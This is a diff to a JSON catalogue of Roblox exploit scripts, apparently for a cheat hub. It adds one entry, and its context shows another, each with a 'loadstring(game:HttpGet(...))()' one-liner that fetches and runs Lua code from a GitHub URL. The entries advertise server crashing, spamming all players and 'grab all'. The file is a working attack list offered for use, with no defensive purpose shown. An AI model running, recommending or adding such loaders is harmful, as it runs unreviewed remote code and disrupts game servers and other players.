@@ -1208,6 +1208,11 @@
             "name": "Server Crasher, Spam Notify All & More",
             "loadstring": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Venera0/mix/main/77_CQYRKT1H.lua'))()",
             "credit": "wekilledtheunicorns"
+        },
+        {
+            "name": "Grab All, Crash Server, RainBow Skin",
+            "loadstring": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven\"))()",
+            "credit": "wekilledtheunicorns"
         }
     ]
 }
